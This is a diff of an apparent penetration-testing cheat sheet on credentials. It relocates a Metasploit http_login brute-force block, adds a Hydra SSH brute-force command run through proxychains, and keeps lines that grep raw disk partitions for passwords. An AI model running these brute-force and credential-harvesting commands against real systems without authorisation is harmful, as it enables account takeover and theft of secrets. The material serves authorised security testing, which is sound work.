@@ -1,16 +1,3 @@
-# HTTP Credentials
-##### Metasploit http_login
-```bash
-msfconsole -q
-use auxiliary/scanner/http/http_login
-set RHOSTS [Target Host]
-set AUTH_URI [Directory]
-set USER_FILE [Username List]
-set PASS_FILE [Password List]
-set VERBOSE false
-run
-```
-
 # Linux Passwd / Shadow
 ### [Password Hashes](../../Services/Cryptography/Hashes/README.md#Shadow-File-Password-Hashes)
 
@@ -38,6 +25,27 @@ strings /dev/sda5 | grep "password="
 strings /dev/sda5 | grep "&password="
 ```
 ##### [Using Swap Digger](../../Tools/Credentials/SwapDigger/README.md#Find-Passwords-in-Swap-File)
+
+# Services
+### HTTP Credentials
+##### Metasploit http_login
+```bash
+msfconsole -q
+use auxiliary/scanner/http/http_login
+set RHOSTS [Target Host]
+set AUTH_URI [Directory]
+set USER_FILE [Username List]
+set PASS_FILE [Password List]
+set VERBOSE false
+run
+```
+
+### SSH
+##### Bruteforce SSH over Proxychains
+```bash
+proxychains hydra -l administrator -P [Password List] [Target Host] ssh
+```
+
 
 # References
 [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
